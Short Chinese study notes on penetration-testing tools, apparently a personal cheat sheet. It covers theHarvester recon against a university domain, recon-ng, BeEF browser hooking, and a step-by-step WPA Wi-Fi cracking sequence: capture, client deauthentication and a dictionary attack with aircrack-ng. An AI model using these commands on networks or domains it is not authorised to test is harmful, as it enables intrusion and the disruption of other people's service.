## 信息收集篇
###  1:theharvester
* 用处：收集电子邮件，子域名，主机，员工姓名，开放的端口和横幅不同的公共来源。
* -d:从某个域搜索：ie:theharvester -d hdu.edu.cn -l 500 -b google
* -b:数据源：如上为google
* -s:结果显示开始数:默认为0
* -h:帮助，具体看这个
### 2:recon-ng
* 用处：有信息收集，侦查，攻击，报告模块，模块可以自行扩展。
* 详细教材看FreeBuf写的文章
##  密码篇

##  攻击篇
### 1:BeEF
* 通过script的src链接到远程js文件，通过js文件获取相关主机信息。
### 2:无线密码破解
1. airmon-ng:查看网卡信息
2. airmon-ng start wlan0mon:监听网卡
3. airodump-ng wlan0mon:扫描wifi信号
4. airodump-ng -w filename -c CH --bssid wifi_mac_addr wlan0mon --ignore-negative-one: 开始抓包（这个进程不得停止）
5. aireplay-ng --deaut 10 -a wifi_mac_addr -c target_mac_addr wlan0mon --ignore-negative-one: 另开窗口并运行
6. aircrack-ng -w word_dic capfile.cap: 字典破解密码
